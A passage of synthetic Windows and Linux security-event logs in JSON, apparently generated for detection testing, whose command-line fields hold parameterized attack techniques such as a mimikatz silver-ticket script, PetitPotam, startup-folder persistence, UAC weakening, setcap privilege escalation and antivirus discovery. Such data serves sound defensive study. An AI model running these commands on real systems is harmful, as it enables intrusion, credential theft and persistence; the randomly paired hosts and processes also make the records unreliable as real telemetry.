        "CommandLine": "\"$url = \\\"#{url_of_wallpaper}\\\"\\n$imgLocation = \\\"#{wallpaper_location}\\\"\\n$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\\\Control Panel\\\\Desktop\\\\' -Name WallPaper).WallPaper\\n$orgWallpaper | Out-File -FilePath \\\"#{pointer_to_orginal_wallpaper}\\\"\\n$updateWallpapercode = @' \\nusing System.Runtime.InteropServices; \\nnamespace Win32{\\n\\n    public class Wallpaper{ \\n        [DllImport(\\\"user32.dll\\\", CharSet=CharSet.Auto)] \\n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \\n         \\n         public static void SetWallpaper(string thePath){ \\n            SystemParametersInfo(20,0,thePath,3); \\n        }\\n    }\\n} \\n'@\\n$wc = New-Object System.Net.WebClient  \\ntry{  \\n    $wc.DownloadFile($url, $imgLocation)\\n    add-type $updateWallpapercode \\n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\\n} \\ncatch [System.Net.WebException]{  \\n    Write-Host(\\\"Cannot download $url\\\") \\n    add-type $updateWallpapercode \\n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\\n} \\nfinally{    \\n    $wc.Dispose()  \\n}\\n\",",
        "LogonID": 614696,
        "LogonGuid": "dec3eb36-6d45-444a-ba1d-935f3ec7951f",
        "SourceProcessID": 3285,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\technology..dll",
        "DestinationProcessID": 8679,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\top..dll",
        "UtcTime": "2024-05-17T01:36:51.600976Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-23.jennings-gallegos.com",
        "User": "charlesanderson",
        "ProcessID": 4381,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$localip = ((ipconfig | findstr [0-9].\\\\.)[0]).Split()[-1]\\n$pieces = $localip.split(\\\".\\\")\\n$firstOctet = $pieces[0]\\n$secondOctet = $pieces[1]\\n$thirdOctet = $pieces[2]\\nforeach ($ip in 1..255 | % { \\\"$firstOctet.$secondOctet.$thirdOctet.$_\\\" } ) {cmd.exe /c nslookup $ip}\\n\",",
        "LogonID": 893790,
        "LogonGuid": "908a9ed8-156e-4167-bf63-72980af62c65",
        "SourceProcessID": 7121,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\yes..dll",
        "DestinationProcessID": 3951,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\which..exe",
        "UtcTime": "2024-05-17T01:36:51.600976Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-20.martinez-gonzalez.com",
        "User": "faulknernathaniel",
        "ProcessID": 1070,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"wmic /node:\\\"#{target_host}\\\" process call create \\\"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\\\"\\n\",",
        "LogonID": 567214,
        "LogonGuid": "81b4912c-44ea-45b6-b840-4c8f2970a8be",
        "SourceProcessID": 7445,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\enjoy..exe",
        "DestinationProcessID": 8496,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\support..dll",
        "UtcTime": "2024-05-17T01:36:51.600976Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-42.perry.com",
        "User": "devinhodges",
        "ProcessID": 2964,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"& \\\"#{petitpotam_path}\\\" #{captureServerIP} #{targetServerIP} #{efsApi}\\nWrite-Host \\\"End of PetitPotam attack\\\"\\n\",",
        "LogonID": 204409,
        "LogonGuid": "3f88712f-31f8-4d7c-bdbe-ef3f4c326052",
        "SourceProcessID": 3939,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\commercial..dll",
        "DestinationProcessID": 8606,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\hotel..exe",
        "UtcTime": "2024-05-17T01:36:51.600976Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-24.wong-perry.com",
        "User": "lambjoe",
        "ProcessID": 7606,
        "ProcessName": "malware.exe",
        "CommandLine": "\"get-process | ?{$_.Description -like \\\"*virus*\\\"}\\nget-process | ?{$_.Description -like \\\"*carbonblack*\\\"}\\nget-process | ?{$_.Description -like \\\"*defender*\\\"}\\nget-process | ?{$_.Description -like \\\"*cylance*\\\"}\\nget-process | ?{$_.Description -like \\\"*mc*\\\"}\\nget-process | ?{$_.ProcessName -like \\\"*mc*\\\"}\\nget-process | Where-Object { $_.ProcessName -eq \\\"Sysmon\\\" }\\n\",",
        "LogonID": 192898,
        "LogonGuid": "10aa1cdd-0eee-4ae4-adf6-aabdac4b4e6c",
        "SourceProcessID": 2445,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\movie..exe",
        "DestinationProcessID": 5963,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\push..exe",
        "UtcTime": "2024-05-17T01:36:51.600976Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-18.watson.com",
        "User": "bentleyholly",
        "ProcessID": 8914,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$Shell = New-Object -ComObject (\\\"WScript.Shell\\\")\\n$ShortCut = $Shell.CreateShortcut(\\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1547.009.lnk\\\")\\n$ShortCut.TargetPath=\\\"cmd.exe\\\"\\n$ShortCut.WorkingDirectory = \\\"C:\\\\Windows\\\\System32\\\";\\n$ShortCut.WindowStyle = 1;\\n$ShortCut.Description = \\\"T1547.009.\\\";\\n$ShortCut.Save()\\n\\n$Shell = New-Object -ComObject (\\\"WScript.Shell\\\")\\n$ShortCut = $Shell.CreateShortcut(\\\"$env:ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1547.009.lnk\\\")\\n$ShortCut.TargetPath=\\\"cmd.exe\\\"\\n$ShortCut.WorkingDirectory = \\\"C:\\\\Windows\\\\System32\\\";\\n$ShortCut.WindowStyle = 1;\\n$ShortCut.Description = \\\"T1547.009.\\\";\\n$ShortCut.Save()\\n\",",
        "LogonID": 395531,
        "LogonGuid": "dc39a94c-26e9-46bf-9270-4604ecacdf81",
        "SourceProcessID": 5845,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\item..exe",
        "DestinationProcessID": 8221,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\involve..exe",
        "UtcTime": "2024-05-17T01:36:51.600976Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-33.parker.net",
        "User": "ericbarnes",
        "ProcessID": 1493,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Set-ItemProperty HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force\",",
        "LogonID": 582607,
        "LogonGuid": "e8ea6ab9-2073-47d2-b5cf-de6eff66c1ae",
        "SourceProcessID": 5405,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\certain..dll",
        "DestinationProcessID": 3506,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\discover..dll",
        "UtcTime": "2024-05-17T01:36:51.600976Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-93.tate.com",
        "User": "amydaugherty",
        "ProcessID": 3958,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\build\\\\namedpipes_executor.exe\\\" --pipe 3\\n\",",
        "LogonID": 172483,
        "LogonGuid": "9b4ac4e3-5dc0-49ac-9a13-b758e2b134dc",
        "SourceProcessID": 9266,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\one..exe",
        "DestinationProcessID": 5370,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\section..exe",
        "UtcTime": "2024-05-17T01:36:51.602540Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-86.taylor-wilson.com",
        "User": "williamlawrence",
        "ProcessID": 5693,
        "ProcessName": "malware.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Event Viewer\\\" /v MicrosoftRedirectionURL /t REG_SZ /d \\\"#{redirection_url}\\\" /f\",",
        "LogonID": 321927,
        "LogonGuid": "14dcc254-8a8a-4c64-94f1-a05da7177cfd",
        "SourceProcessID": 2617,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\sing..exe",
        "DestinationProcessID": 4605,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\because..dll",
        "UtcTime": "2024-05-17T01:36:51.602540Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-44.leach-mills.com",
        "User": "kellyrebecca",
        "ProcessID": 1937,
        "ProcessName": "nc.exe",
        "CommandLine": "\"cmd.exe /c \\\"net use \\\\\\\\#{computer_name}\\\\#{share_name} #{password} /u:#{user_name}\\\"\\n\",",
        "LogonID": 893116,
        "LogonGuid": "d7128c2b-6ba8-4b77-9563-46e4854687fc",
        "SourceProcessID": 3514,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\worker..exe",
        "DestinationProcessID": 5831,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\bank..dll",
        "UtcTime": "2024-05-17T01:36:51.602540Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-55.blair.com",
        "User": "chapmanlisa",
        "ProcessID": 5375,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe /out:\\\"$env:localappdata\\\\Microsoft\\\\WindowsApps\\\\Get-Variable.exe\\\" \\\"PathToAtomicsFolder\\\\T1574.008\\\\bin\\\\calc.cs\\\"\\nPowershell -noprofile\\n\",",
        "LogonID": 783250,
        "LogonGuid": "581c5abc-dce2-41cd-8451-99431711a595",
        "SourceProcessID": 4068,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\organization..dll",
        "DestinationProcessID": 1972,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\push..exe",
        "UtcTime": "2024-05-17T01:36:51.602540Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-54.martin.com",
        "User": "jennifer70",
        "ProcessID": 4010,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\\nAdd-Type -MemberDefinition '[DllImport(\\\"user32.dll\\\")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;\\n[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\\ncmd /c \\\"timeout #{recording_time} > NULL && psr.exe /stop\\\"\\n\",",
        "LogonID": 856605,
        "LogonGuid": "0f3bef05-8250-4663-bb9a-89d55609b42c",
        "SourceProcessID": 2370,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\floor..exe",
        "DestinationProcessID": 8450,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\modern..exe",
        "UtcTime": "2024-05-17T01:36:51.602540Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-99.miller-horn.com",
        "User": "martinjohn",
        "ProcessID": 6838,
        "ProcessName": "malware.exe",
        "CommandLine": "\"pw useradd art -g wheel -s /bin/sh\\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\\npw lock art\\npw usermod art -e +1d\\npw unlock art\\npw user mod art -e +99d\\nsu art\\nwhoami\\nexit\\n\",",
        "LogonID": 299892,
        "LogonGuid": "cd73657c-b645-4730-874a-41ec518d6b20",
        "SourceProcessID": 3636,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\option..dll",
        "DestinationProcessID": 3861,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\economy..exe",
        "UtcTime": "2024-05-17T01:36:51.603493Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-32.davis.com",
        "User": "kfisher",
        "ProcessID": 1785,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"cp #{payload} /tmp/cap.c\\nmake /tmp/cap\\nsudo setcap cap_setuid=ep /tmp/cap\\n/tmp/cap\\n\",",
        "LogonID": 453413,
        "LogonGuid": "e6f12371-2fd3-4c97-a633-a2e2058c7b77",
        "SourceProcessID": 6595,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\suffer..exe",
        "DestinationProcessID": 4426,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\candidate..exe",
        "UtcTime": "2024-05-17T01:36:51.603493Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-71.mccann-burnett.info",
        "User": "madison70",
        "ProcessID": 4370,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"md #{folder_name}\\necho too many secrets > #{folder_name}\\\\#{hidden_filename}\\n\",",
        "LogonID": 101977,
        "LogonGuid": "2e070266-294f-4295-8637-b092adf24808",
        "SourceProcessID": 1696,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\lose..dll",
        "DestinationProcessID": 9476,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\forward..exe",
        "UtcTime": "2024-05-17T01:36:51.603493Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-64.campbell.com",
        "User": "jason52",
        "ProcessID": 6629,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"sudo #{program_path} -4 -p 6 -t 3\\n\",",
        "LogonID": 301998,
        "LogonGuid": "b3f3b51c-6a5d-42ad-ae10-aaf50aafc6fc",
        "SourceProcessID": 9022,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\weight..exe",
        "DestinationProcessID": 7007,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\idea..exe",
        "UtcTime": "2024-05-17T01:36:51.603493Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-59.hawkins.com",
        "User": "dariusbenton",
        "ProcessID": 1327,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"tail /var/log/ufw.log\\n\",",
        "LogonID": 688216,
        "LogonGuid": "2a59d652-4d60-4a4a-83f5-89da9ef1f566",
        "SourceProcessID": 9909,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\yet..dll",
        "DestinationProcessID": 4864,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\according..exe",
        "UtcTime": "2024-05-17T01:36:51.604493Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-56.avery-bass.com",
        "User": "richardsondonald",
        "ProcessID": 2418,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Remove-Item $env:TEMP\\\\silver.bat -ErrorAction Ignore\\nRemove-Item $env:TEMP\\\\silver.txt -ErrorAction Ignore\\n\\n# get current domain SID if default was used\\n$domain_sid = \\\"#{domain_sid}\\\"\\nIf ($domain_sid -Match \\\"DEFAULT\\\") {\\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\\n}\\n\\n# create batch file with commands to run in a separate \\\"runas /netonly\\\" session\\n# so we don't purge Kerberos ticket from the current Windows session\\n# its output goes to silver.txt temp file, because we cannot capture \\\"runas /netonly\\\" output otherwise\\n@\\\"\\n>%TEMP%\\\\silver.txt 2>&1 (\\n  echo Purge existing tickets and create silver ticket:\\n  klist purge\\n  #{mimikatz_path} \\\"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{service_aes256_key} /user:#{account} /service:HOST /target:#{target}.#{domain} /ptt\\\" \\\"exit\\\"\\n\\n  echo.\\n  echo executing:schtasks /query /S #{target}.#{domain}\\n  schtasks /query /S #{target}.#{domain}\\n  \\n  echo.\\n  echo Tickets after requesting schtasks:\\n  klist\\n\\n  echo.\\n  echo End of Silver Ticket attack\\n)\\n\\\"@ -Replace \\\"DOMAIN_SID\\\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\\\silver.bat\\n\\n# run batch file in a new empty session (password and username do not matter)\\necho \\\"foo\\\" | runas /netonly /user:fake \\\"$env:TEMP\\\\silver.bat\\\" | Out-Null\\n\\n# wait until the output file has logged the entire attack\\ndo {\\n  Start-Sleep 1 # wait a bit so the output file has time to be created\\n  Get-Content -Path \\\"$env:TEMP\\\\silver.txt\\\" -Wait | ForEach-Object {\\n    if ($_ -match 'End of Silver Ticket attack') { break } \\n  }\\n} while ($false) # dummy loop so that 'break' can be used\\n\\n# show output from new empty session\\nGet-Content $env:TEMP\\\\silver.txt\\n\\n# cleanup temp files\\nRemove-Item $env:TEMP\\\\silver.bat -ErrorAction Ignore\\nRemove-Item $env:TEMP\\\\silver.txt -ErrorAction Ignore\\n\",",
        "LogonID": 120221,
        "LogonGuid": "14d8990c-aabc-42d9-9d14-9630166c8721",
        "SourceProcessID": 3582,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\true..dll",
        "DestinationProcessID": 5755,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\culture..exe",
        "UtcTime": "2024-05-17T01:36:51.604493Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-69.bowman.net",
        "User": "catherinelee",
        "ProcessID": 1565,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\\n\",",
        "LogonID": 653057,
        "LogonGuid": "a4c9e7e9-df3e-49aa-998e-2371fade7f49",
        "SourceProcessID": 2346,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\little..exe",
        "DestinationProcessID": 4200,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\agreement..dll",
        "UtcTime": "2024-05-17T01:36:51.604493Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-80.boyle-harper.com",
        "User": "stephenhernandez",
        "ProcessID": 2043,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"cd \\\"#{rsp_file_path}\\\"\\nodbcconf.exe -f \\\"#{rsp_file_name}\\\"\\n\",",
        "LogonID": 239969,
        "LogonGuid": "b8b934cd-95fb-43a1-a855-6014b7402ead",
        "SourceProcessID": 8339,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\lot..exe",
        "DestinationProcessID": 9140,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\eight..exe",
        "UtcTime": "2024-05-17T01:36:51.604493Z"
    },
